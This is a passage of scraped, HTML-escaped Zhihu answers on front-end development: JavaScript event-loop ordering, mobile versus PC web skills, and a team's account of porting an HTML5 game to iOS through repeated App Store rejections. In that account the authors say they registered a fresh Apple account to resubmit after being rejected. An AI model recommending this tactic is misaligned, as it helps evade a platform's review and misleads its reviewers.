class=&quot;nx&quot;&gt;setImmediate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;\n    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;\n&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;\n&lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;\n    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;\n&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;\n&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Promise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;\n    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;\n    &lt;span class=&quot;nx&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;\n    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;\n&lt;span class=&quot;p&quot;&gt;}).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;\n    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;\n&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;\n&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;\n&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nextTick&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;\n    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;\n&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;\n&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;br&gt;结果：3 4 6 8 7 5 2 1&lt;img src=&quot;https://pic1.zhimg.com/e9f416bbb15d3fdd62e34c3f3aad4ac4_b.png&quot; data-rawwidth=&quot;29&quot; data-rawheight=&quot;136&quot; class=&quot;content_image&quot; width=&quot;29&quot;&gt;&lt;br&gt;事件的注册顺序如下：&lt;br&gt;&lt;b&gt;setImmediate - &lt;/b&gt;&lt;b&gt;setTimeout - &lt;/b&gt;&lt;b&gt;promise.then - process.nextTick&lt;/b&gt;&lt;br&gt;&lt;br&gt;因此，我们得到了优先级关系如下：&lt;br&gt;&lt;b&gt;process.nextTick &amp;gt; promise.then &amp;gt; setTimeout &amp;gt; setImmediate&lt;/b&gt;&lt;br&gt;&lt;br&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;br&gt;&lt;br&gt;&lt;b&gt;更新二：&lt;/b&gt;&lt;br&gt;&lt;br&gt;后来讨论进入了白热化，大神“&lt;b&gt;東方（成都-潜水猪）&lt;/b&gt;”提到了&lt;b&gt;promsieA+规范&lt;/b&gt;。&lt;br&gt;&lt;br&gt;&lt;a href=&quot;//link.zhihu.com/?target=http%3A//www.ituring.com.cn/article/66566&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;图灵社区 : 阅读 : 【翻译】Promises/A+规范&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;https://pic4.zhimg.com/84adf855dd07462f097c1489eabbd643_b.png&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;509&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic4.zhimg.com/84adf855dd07462f097c1489eabbd643_r.png&quot;&gt;&lt;br&gt;然而，后面的&lt;b&gt;译者注&lt;/b&gt;有问题，与前面的优先级实验不符。&lt;br&gt;&lt;b&gt;process.nextTick &amp;gt; promise.then &amp;gt; setTimeout &amp;gt; setImmediate&lt;/b&gt;&lt;br&gt;&lt;img src=&quot;https://pic3.zhimg.com/51f4d8ee42821c681331faf2a09c857e_b.png&quot; data-rawwidth=&quot;602&quot; data-rawheight=&quot;258&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;602&quot; data-original=&quot;https://pic3.zhimg.com/51f4d8ee42821c681331faf2a09c857e_r.png&quot;&gt;又翻到了原版：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//promisesaplus.com/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;promisesaplus.com/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;https://pic2.zhimg.com/1f5d7499d36b96ce51b7e20896acb7c1_b.png&quot; data-rawwidth=&quot;803&quot; data-rawheight=&quot;213&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;803&quot; data-original=&quot;https://pic2.zhimg.com/1f5d7499d36b96ce51b7e20896acb7c1_r.png&quot;&gt;原版的含义，有种依赖于实现的意思，随便玩。。。&lt;br&gt;而且macro-task和micro-task到底包含哪些也没详细说。&lt;br&gt;&lt;br&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;br&gt;&lt;br&gt;&lt;b&gt;更新三：&lt;/b&gt;&lt;br&gt;&lt;br&gt;然后，重新看了遍聊天记录，原来“&lt;b&gt;-超亼/夿夿（广州—坚壳）&lt;/b&gt;”大神已经指出过了。。。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/fcd961794dedc6d2e44588f2579a3840_b.png&quot; data-rawwidth=&quot;511&quot; data-rawheight=&quot;127&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;511&quot; data-original=&quot;https://pic1.zhimg.com/fcd961794dedc6d2e44588f2579a3840_r.png&quot;&gt;&lt;br&gt;又翻到了&lt;b&gt;汉语版promsieA+规范中引的那篇文章&lt;/b&gt;。&lt;br&gt;&lt;img src=&quot;https://pic4.zhimg.com/effe01c28c37a226807cea60688e2023_b.png&quot; data-rawwidth=&quot;574&quot; data-rawheight=&quot;185&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;574&quot; data-original=&quot;https://pic4.zhimg.com/effe01c28c37a226807cea60688e2023_r.png&quot;&gt;&lt;br&gt;文章链接：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//wengeezhang.com/%3Fp%3D11&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Promise进阶介绍+原生实现&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;https://pic2.zhimg.com/7d5566575a7e5c24fb05eb592702956d_b.png&quot; data-rawwidth=&quot;664&quot; data-rawheight=&quot;473&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;664&quot; data-original=&quot;https://pic2.zhimg.com/7d5566575a7e5c24fb05eb592702956d_r.png&quot;&gt;&lt;br&gt;&lt;b&gt;一切都明朗了&lt;/b&gt;。&lt;br&gt;&lt;br&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;br&gt;&lt;br&gt;&lt;b&gt;更新四：&lt;/b&gt;&lt;br&gt;&lt;br&gt;其实大神“&lt;b&gt;最爱柠檬（南京-菜B檬檬&lt;/b&gt;&lt;b&gt;）&lt;/b&gt;”一开始就贴了V8源码。。。&lt;br&gt;&lt;img src=&quot;https://pic2.zhimg.com/a6d2777a9593a3b8bc14d899c4b165cd_b.png&quot; data-rawwidth=&quot;470&quot; data-rawheight=&quot;263&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;470&quot; data-original=&quot;https://pic2.zhimg.com/a6d2777a9593a3b8bc14d899c4b165cd_r.png&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/8e3aa96fe448305d601118414766f43b_b.png&quot; data-rawwidth=&quot;477&quot; data-rawheight=&quot;370&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;477&quot; data-original=&quot;https://pic4.zhimg.com/8e3aa96fe448305d601118414766f43b_r.png&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/c7056f25502beba76a1f0ad3cded817d_b.png&quot; data-rawwidth=&quot;479&quot; data-rawheight=&quot;237&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;479&quot; data-original=&quot;https://pic2.zhimg.com/c7056f25502beba76a1f0ad3cded817d_r.png&quot;&gt;&lt;br&gt;只是吾等平民，实在太锉了。。。&lt;br&gt;（眼下，&lt;b&gt;正在被虐中。。。&lt;/b&gt;&lt;br&gt;&lt;br&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;br&gt;&lt;br&gt;&lt;b&gt;感悟1：人丑就该多读书。&lt;/b&gt;&lt;br&gt;&lt;b&gt;感悟2：你永远都没有新的想法，除非在写博士论文。&lt;/b&gt;&lt;br&gt;&lt;b&gt;感悟3：我不生产答案，我只是大神们聊天记录的搬运工。&lt;/b&gt;&lt;br&gt;&lt;br&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;br&gt;&lt;br&gt;（先发这些，以后有新结论再更新。。。&lt;br&gt;&lt;br&gt;&lt;b&gt;剩下的疑问：&lt;/b&gt;&lt;br&gt;&lt;b&gt;process.nextTick也会放入microtask quque，为什么优先级比promise.then高呢？&lt;/b&gt;&lt;br&gt;&lt;b&gt;到底是不是setTimeout有一个依赖实现的最小延迟？4ms？&lt;br&gt;&lt;/b&gt;&lt;br&gt;QQ群：JS高级前端开发 159758989&lt;br&gt;总入口：JS前端开发跳板群 492107297</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n<img src=\"https://pic3.zhimg.com/f7cabad79a3fd52b5d9de3df14791aba_200x112.png\" data-rawwidth=\"578\" data-rawheight=\"175\" class=\"origin_image inline-img zh-lightbox-thumb\" data-original=\"https://pic3.zhimg.com/f7cabad79a3fd52b5d9de3df14791aba_r.png\">\n<b>先把问题贴一下：</b> Promise的队列与setTimeout的队列的有何关联？ setTimeout(function(){console.log(4)},0);\nnew Promise(function(resolve){\n console.log(1)\n for( var i=0 ; i&lt;10000 ; i++ ){\n i==9999 &amp;&amp; resolve()\n }\n console.log(2)\n}).then(functi…\n\n<a href=\"/question/36972010/answer/71338002\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2015-11-08\" target=\"_blank\" href=\"/question/36972010/answer/71338002\">编辑于 2015-11-09</a></p>\n\n",
    "link": "https://zhihu.com/question/36972010/answer/71338002"
  },
  {
    "question": "\n前端里移动端到底比 PC 端多哪些知识，为什么面试时好多公司都问 H5 水平如何？该从哪里入手学习？\n",
    "author": "互联网老黑",
    "content": "\n\n<textarea hidden class=\"content\">&lt;b&gt;我做过几年的web前端开发，就简单谈谈自己的感受吧。&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;首先来看看PC端和移动端在前端开发上的一些区别：&lt;/b&gt;&lt;br&gt;&lt;br&gt;（1）PC考虑的是浏览器兼容性，移动端开发考虑的更多的是手机兼容性，因为目前不管是android手机还是ios手机，一般浏览器用的都是webkit内核，所以做移动端开发，更多考虑的应该是手机分辨率的适配，和不同操作系统的略微差异化；&lt;br&gt;&lt;br&gt;（2）在部分事件的处理上，移动端自然是偏向于触屏的，所以触屏事件的一些规律要多摸索一下，另外包括移动端弹出的手机键盘该如何处理，这样的问题在PC上肯定不会遇到，但在移动端，如果你没有经验，处理起来是相当麻烦的；&lt;br&gt;&lt;br&gt;（3）在布局上，移动端开发一般是要做到布局自适应的，在这里我推荐用rem的解决方案，具体实现可以百度一下，相对比较简单，处理起来也比较灵活；&lt;br&gt;&lt;br&gt;（4）在动画处理上，PC端由于要考虑到IE的兼容性，通常用JS做动画的通用性会好一些，但相比CSS3却牺牲了较大的性能，而在手机端，如果要做一些动画、特效等，第一选择肯定是CSS3，既简单，效率又高。&lt;br&gt;&lt;br&gt;区别就说到这里，也许还不完全，我也是想到哪就说到哪，下面来谈谈如果要做移动端的web开发，也就是题主说的h5开发，在已有PC端的web开发基础上，&lt;b&gt;还需要再研究哪些技术：&lt;/b&gt;&lt;br&gt;&lt;br&gt;（1）微信的一些接口最好都能去实现一遍，熟悉一下肯定有好处的，比如领导让你通过微信分享的文章，title、description、以及icon图标怎么配置，你说你不清楚，那就太水了；&lt;br&gt;&lt;br&gt;（2）百度地图的一些API接口，有时间也去熟悉一下吧，对于移动端来讲，LBS还是一个非常重要的特性，所以地图这块肯定也是需要了解的，再加上百度地图已经是一个比较成熟的平台了，学起来也不费事儿；&lt;br&gt;&lt;br&gt;（3）CSS3的动画去熟悉一下，至少最基本的一些动画实现和算法要了解，在移动端应该也算用得比较多的；&lt;br&gt;&lt;br&gt;（4）一般pc用jquery，移动端用zepto，这没什么好说的，在这里主要是想提醒大家，移动端的流量相对还是比较重要的，所以引入的资源或插件，能小则小，一个30k的资源和80k的资源，在移动端还是相差挺大的；&lt;br&gt;&lt;br&gt;（5）最好能掌握一套完整的前端开发架构，比如模块化、打包、压缩、缓存、发布，有条件的还能做一下自动化测试等等，我用过的有fis，还不错，牛逼的朋友可以自己写一套，另外再多说一句，如果想快速提升自己的前端开发技术，钻研前端架构这块是一个非常好的方向。&lt;br&gt;&lt;br&gt;这几个月，还抽空写了一个APP，android和ios版本的都有，有兴趣的朋友可以加微信：&lt;b&gt;laoheipm&lt;/b&gt;，一起交流，一起进步！</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n<b>我做过几年的web前端开发，就简单谈谈自己的感受吧。</b> <b>首先来看看PC端和移动端在前端开发上的一些区别：</b> （1）PC考虑的是浏览器兼容性，移动端开发考虑的更多的是手机兼容性，因为目前不管是android手机还是ios手机，一般浏览器用的都是webkit内核，所以做移…\n\n<a href=\"/question/35633784/answer/64355839\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2015-09-19\" target=\"_blank\" href=\"/question/35633784/answer/64355839\">编辑于 2015-09-21</a></p>\n\n",
    "link": "https://zhihu.com/question/35633784/answer/64355839"
  },
  {
    "question": "\n第一次看HTML教程是怎样一种体验？\n",
    "author": "Ivony",
    "content": "\n\n<textarea hidden class=\"content\">卧槽浏览器好厉害，写成这B样都能正确显示，换了编译器的话早就一堆warning+error了。</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n卧槽浏览器好厉害，写成这B样都能正确显示，换了编译器的话早就一堆warning+error了。\n\n<a href=\"/question/33190226/answer/57079417\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" target=\"_blank\" href=\"/question/33190226/answer/57079417\">发布于 2015-07-30</a></p>\n\n",
    "link": "https://zhihu.com/question/33190226/answer/57079417"
  },
  {
    "question": "\nHTML5 游戏移植为 iOS 原生应用，需要注意哪些地方？有什么经验可以分享？\n",
    "author": "赵霏",
    "content": "\n\n<textarea hidden class=\"content\">很巧去年11月份我们开始决定进行HTML5手机页游《猎魔佣兵》的iOS版本打包工作。这也是我们首次进行iOS版本的封包，此前坊间有各种各样说法流传，苹果已经对WebApp加大了审核的严格程度，有一大批HTML5的游戏和应用纷纷都被斩于马下。带着这样忐忑不安的心情，我们开始了将手中基于HTML5开发的角色扮演网游《猎魔佣兵》封包上线的悲壮之路，期间历经各种坎坷又峰回路转，跌宕起伏，很值得回味。我不敢敝帚自珍，于是一一记录下来，以飨知乎上的游戏创业者朋友。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/47dfb82453449ad785fabb8a96697e70_b.jpg&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;450&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic1.zhimg.com/47dfb82453449ad785fabb8a96697e70_r.jpg&quot;&gt;（手机页游：《猎魔佣兵》）&lt;br&gt;&lt;br&gt;&lt;b&gt;1&lt;/b&gt;&lt;b&gt;）游戏封包仓促上线，产品定价遭遇冷脸；&lt;/b&gt;&lt;br&gt;      项目会后我们把需求提给技术人员，起初大家并没有把这个事情看的很难，因为我们的HTML5游戏引擎完全是自主研发的，而内核采用的是Canvas和Dom混合模式。我们预先设定的方案也是直接在苹果平台上用Xcode进行打包，把自己的Javascript脚本，美术资源和webview组件封装在一起。经过测试发现本地加载读取是可行的，于是安装包分分钟就做好了。很快我在苹果商店做好了文字说明，截图以及安装包上传。正在为自己的高效工作沾沾自喜，几天后苹果的测试结果就打回来了，拒绝上线，原因却是游戏中仍保留了一封内测的邮件。&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/1c4af9c73a4ce28d6a08c25ea7b7d0c8_b.jpg&quot; data-rawwidth=&quot;545&quot; data-rawheight=&quot;235&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;545&quot; data-original=&quot;https://pic1.zhimg.com/1c4af9c73a4ce28d6a08c25ea7b7d0c8_r.jpg&quot;&gt;所以不管是游戏内部还是游戏描述，千万不要有“内测”啊，test啊，demo啊， beta啊这些字样，苹果会以为你对用户不负责，拿用户来测试你的产品。（可国内的页游为了规避政策不都这么做的嘛 =_=...）很快我们就删掉了所有相关字眼，仔细检查后，怀着忐忑的心情，再次提交AppStore。&lt;br&gt;一周后，杯具继续传来，我们又被拒了。&lt;br&gt;      这次被拒绝的原因是游戏的内置付费问题。苹果上网游的内置付费的道具的标价很重要，单价千万不要超过99美金。我们的某个道具单价为648￥，完全超过99美金。于是我们被打回，继续埋头修改，将单价降到 68￥，继续提交，虔诚的等待结果。（看来太过于贪婪真的是祸根呀...囧rg）&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/1da3b2c70f84592471bcc75816044968_b.jpg&quot; data-rawwidth=&quot;516&quot; data-rawheight=&quot;257&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;516&quot; data-original=&quot;https://pic1.zhimg.com/1da3b2c70f84592471bcc75816044968_r.jpg&quot;&gt;可是福不双至，祸不单行，结果又被打回。苹果说，你的道具一次性售出的总价也不能超过99美金。这个怎么理解呢？我们将道具单价将为 68￥，但是我们允许用户一次性购买10份，那总价就是680￥，结果又毫无压力超出99美金。苹果说了，这还是不行啊，总价也不能超过99美金啊，于是我们又哼哧哼哧修改，改好提交上去了。（分特，你早怎么不说呢。对于游戏内计费的苛刻，苹果也算是计较到了极点，其实放在国内的哪个商店或者平台不是都希望扣用户钱越多越好呢~）&lt;br&gt;然后我们就在欢天喜地中又迎来了第四次被打回。这次依然是付费问题。这一次比较小纠结。上回不是说总价也不能超过99美金嘛，那好办，当用户购买5份，以及以上的份数，我们都不予他购买。这是神马意思呢，玩家点旁边那个 加号，加到5以后，他点购买会没有反应，但是加到5之前，都是正常购买的。这不是为了响应苹果的号召，总价必须低于99美金嘛。但是苹果又喊停了，为啥呢？为啥我加到5没反应啊？这是bug! 既然你不允许玩家买5份，干嘛你又允许玩家加到5呢？于是我们无言以对，又默默把 5以及 5以上的选择都取消了，点加号只能加到4...(哇呀呀，心中无数只草泥马奔腾而过呀~)&lt;br&gt;&lt;br&gt;&lt;b&gt;2&lt;/b&gt;&lt;b&gt;）搬来高手精研学习，评审经验互通有无；&lt;br&gt;&lt;/b&gt;接二连三的被打回，让几个老大们真的着急了。眼瞅着就要过年，大家实在都一筹莫展。实在不行就去找高手聊聊吧，于是几个老大出面，请到了几位据说是有着与苹果丰富斗争经验的大牛来到公司座谈交流。“三个臭皮匠，顶一个诸葛亮”\n尔后大家针对我们的游戏产品给出了不少干货的建议。他们建议关键字的选择不要涉及版权，建议尽量多的把文字写在游戏截图上，建议图标设计的需要把握的尺度，不要贪心一次提交很多版本，同时也给了第一次接到苹果审核的拒绝结果后两个小时应该有的反馈...林林总总这里就不一一赘述了。但这让我想起了曾经的高考前夕，化学老师曾对小编说过的那些话，七月流火，八月融金，数百高考判卷老师汇集火炉南京挥汗如雨给百万考生审卷，你们想想如果字迹不工整，卷面不整洁下场会是如何？囧rg，我想苹果的审核大神们估计也有同感吧。终于在同志们的春天般关怀下，我们终于把看似完美的包提交了上去，再次忐忑不安的等待着再次表白的结果...&lt;br&gt;&lt;img src=&quot;https://pic1.zhimg.com/1709bfd9bff93aad227ae825f9f44584_b.jpg&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;450&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic1.zhimg.com/1709bfd9bff93aad227ae825f9f44584_r.jpg&quot;&gt;&lt;br&gt;&lt;b&gt;3&lt;/b&gt;&lt;b&gt;）连受打击屡败屡战，咬牙切齿Web&lt;/b&gt;&lt;b&gt;拒版；&lt;br&gt;&lt;/b&gt;最最不幸的事情终于发生了，我们的游戏在春节前最后一周接到了苹果的「病危通知书」，他说我们的游戏是基于web的游戏，建议我们提交给流量几乎为零的WebAppStore，宛如一桶凉水泼下来，从头到脚，这基本宣判了我们产品的死刑，（T_T）。我怀着沮丧的心情回家度过了难忘的2013年春节，强颜欢笑，食不知味…&lt;br&gt;&lt;br&gt;&lt;b&gt;4&lt;/b&gt;&lt;b&gt;）炮竹一声辞别旧岁，来年新春路转峰回；&lt;br&gt;&lt;/b&gt;春节收假后，大家重新回到了公司。心有不甘有木有，各种撞墙有木有，于是老大把项目组的人重新召集到了大会议室开小诸葛会。虽然桌上摊满了各地带回来的特色零食，可是谁也没有心情吃，很快你一言我一语气氛开始活跃起来，讨论目标就是如何能让《猎魔佣兵》正式上线。首先我们检查了一下之前所碰到的各种零零碎碎的问题，都可以得到了技术和产品的全面解决。我们又找到了AppStore上有一部分跟我们类似的原生与网页混合打包产品，分析后得出的结论是，无论从画面，还是用户操作，投入一些细节的设计和修改，我们是可以把Webapp产品做到原生的体验，同时也捂脸之前图快图省事的想法。一方面我们也觉得是否在于之前被打回来的次数过多，所以苹果加强了对我们这款游戏的审核力度，导致最后杯具的结局。通过分析出这些原因，也就详细的拟定了修改的方案，安排技术大牛光哥又重新开始了我们的苹果之旅。&lt;br&gt;      这一次我们大大增加了原生代码的数量，将游戏的登录注册选服加载客服等等界面都用原生代码完成，适当的增加了动画特效，进入游戏后，我们替换了底栏菜单和聊天部分，同时加入了游戏的背景音乐。新完成的安装包，基本可以说原生代码和网页脚本比例达到了3:7的程度。&lt;br&gt;最后我们重新注册了苹果账号，换了个马甲，继续提交（你懂的）。&lt;br&gt;结果很快下来了，Ready for sale，过了！&lt;br&gt;&lt;img src=&quot;https://pic3.zhimg.com/ab03c26fca252cec1c188c6f0ce18b1e_b.jpg&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;450&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic3.zhimg.com/ab03c26fca252cec1c188c6f0ce18b1e_r.jpg&quot;&gt;&lt;br&gt;&lt;b&gt;5&lt;/b&gt;&lt;b&gt;）回首长叹经验总结，抛砖引玉造福社会；&lt;/b&gt;&lt;br&gt;经过这一番折腾，老大让我总结一下这次的经验，不过我一直觉得最大的决定因素还是在于人品，人品值不行的还需要继续修炼呀。(*^__^*) &lt;br&gt;&lt;br&gt;1）苹果的审核确实非常尽职尽责，每一个可能的细节都不会放过。但感觉单机游戏如果只是下载收费要比有内置计费的网游容易通过的多，所以网游开发的同学们一定要在计费接口部分多下功夫，一定要严格遵守苹果的规范呀！&lt;br&gt;&lt;br&gt;2）在提交时候，不要贪心同时提交iPhone和iPad两个版本，我们因为《猎魔佣兵》是HTML5技术可以自动适配屏幕分辨率于是全机型打钩提交上去，结果被苹果打回来的时候告知完全没区别嘛，囧rg&lt;br&gt;&lt;br&gt;3）HTML5的游戏开发应该尽量使用Canvas来渲染画面，而Dom可以用在菜单和一些文字输入类控件即可。原生代码则主要用来制作框架容器和部分菜单，并且完成游戏进入前的界面和各种动画特效，声音声效的播放以及对话框和聊天部分。所有游戏第一次进入用到的图像和声音等资源打包为bundle模式，全部放在本地，更多的地图，副本的图像声音资源可以考虑分阶段下载。最后我们完成的安装包大小为33M，便于下载安装。一句话，多加一些Native的代码让你的HTML5游戏产品制作的更加接近原生体验吧！&lt;br&gt;&lt;img src=&quot;https://pic2.zhimg.com/d976d20c02ce6043c9210f423f7cdb51_b.jpg&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;450&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic2.zhimg.com/d976d20c02ce6043c9210f423f7cdb51_r.jpg&quot;&gt;&lt;br&gt;4）苹果对于Webapp的顾虑可能会在外链，第三方计费控制等问题吧，所以我建议这方面还是老实一点，不耍小聪明，万一上了线乱搞也有可能会被苹果踢下来。因此我们也会继续踏踏实实的做好游戏产品，遵守苹果的规范，认真服务于玩家。&lt;br&gt;&lt;br&gt;5）在游戏的打包中我们也可以通过原生代码不但增加了一键登录同时也把第三方统计平台加入进来，比如友盟，appcpa等等。&lt;br&gt;&lt;br&gt;不过说到这里恐怕会有不少看官质疑，你们干脆用原生开发多好呀，干嘛非死乞白赖的用HTML5打包呢？我下面就阐述一下我们之所以选用HTML5技术开发手机游戏的理由：&lt;br&gt;&lt;br&gt;1）用HTML5开发手机应用和游戏的效率会稍高一些，成本也会略有降低。这主要体现在各种智能手机终端的移植上，我们前端都是javascript工程师，而打包移植的工作有1个人就可以快速搞定。不需要同时维护若干个团队和若干个版本。这是我们安卓版本下载地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//g.duopao.com/apk/download%3Futm_source%3Dghzj_v1.2.1&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span 